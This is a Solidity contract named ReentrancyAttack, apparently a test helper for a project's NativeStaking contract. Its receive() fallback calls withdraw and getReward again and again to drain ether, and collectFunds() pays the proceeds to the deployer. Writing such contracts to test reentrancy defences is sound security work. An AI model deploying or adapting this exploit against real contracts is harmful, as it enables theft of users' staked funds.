// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Staking.sol"; 

contract ReentrancyAttack {

    NativeStaking public victim;
    address owner;

    constructor(address _victim) {
        victim = NativeStaking(_victim);
        owner = msg.sender;
    }

    // This function is used to start the attack.
    function attack(uint256 _amountToken, uint256 amountH1) external payable {
        // The attacker stakes some tokens and Ether first
        // victim.stake(_amountToken);
        // payable(address(victim)).transfer(_amountH1);

        // The attacker initiates the withdrawal, which will trigger the fallback function
        victim.withdraw(_amountToken, amountH1);
    }
    function attackRewards() external payable {
        // The attacker stakes some tokens and Ether first
        // victim.stake(_amountToken);
        // payable(address(victim)).transfer(_amountH1);

        // The attacker initiates the withdrawal, which will trigger the fallback function
        victim.getReward();
    }

    // This is the fallback function which will be called when the victim contract sends Ether back.
    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw(0, 1 ether);
        }
        else {
            victim.getReward();
        }
    }

    function collectFunds() external {
        payable(owner).transfer(address(this).balance);
    }
}
